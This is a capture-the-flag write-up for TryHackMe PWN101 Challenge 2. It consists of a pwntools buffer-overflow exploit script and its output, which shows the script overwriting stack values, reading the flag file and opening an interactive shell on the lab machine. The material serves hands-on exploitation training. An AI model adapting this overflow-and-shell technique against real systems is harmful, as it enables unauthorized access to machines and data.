# TryHackMe PWN101

## Challenge 2

### Exploit

```python
#!/bin/env python3

from pwn import *
import argparse

payload = b"A"*104
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

parser = argparse.ArgumentParser(description='TryHackMe PWN101 Challenge 2 Exploit')

subparsers = parser.add_subparsers(dest='mode', help='Select mode: remote or local')

remote_parser = subparsers.add_parser('remote', help='Remote mode: Provide IP address and port to connect')
remote_parser.add_argument('ip', help='IP address of remote server')
remote_parser.add_argument('port', help='Port number of remote server')

local_parser = subparsers.add_parser('local', help='Local mode: Provide file path')
local_parser.add_argument('file', help='File path')

args = parser.parse_args()

mode = args.mode

if mode == 'remote':
    ip = args.ip
    port = args.port

    p = remote(ip, port)

elif mode == 'local':
    file = args.file

    context.binary = binary = ELF(file)
    p = process()
    
else:
    parser.error('Please select remote or local mode.')
    

p.recvuntil(b' I right? ')

log.info("Sending payload.")
p.sendline(payload)
p.recvline()

log.info("Getting Flag.")
p.sendline(b"cat flag.txt")
flag = p.recvline()
log.success("Flag achieved!: " + flag.decode())

log.success("Getting Shell.")
p.interactive()
```

### Output

```bash
$ ./exploit.py remote 10.10.231.62 9002
[+] Opening connection to 10.10.231.62 on port 9002: Done
[*] Sending payload.
[*] Getting Flag.
[+] Flag achieved!: THM{[REDACTED]}
[+] Getting Shell.
[*] Switching to interactive mode
$ id
uid=1003(pwn102) gid=1003(pwn102) groups=1003(pwn102)
```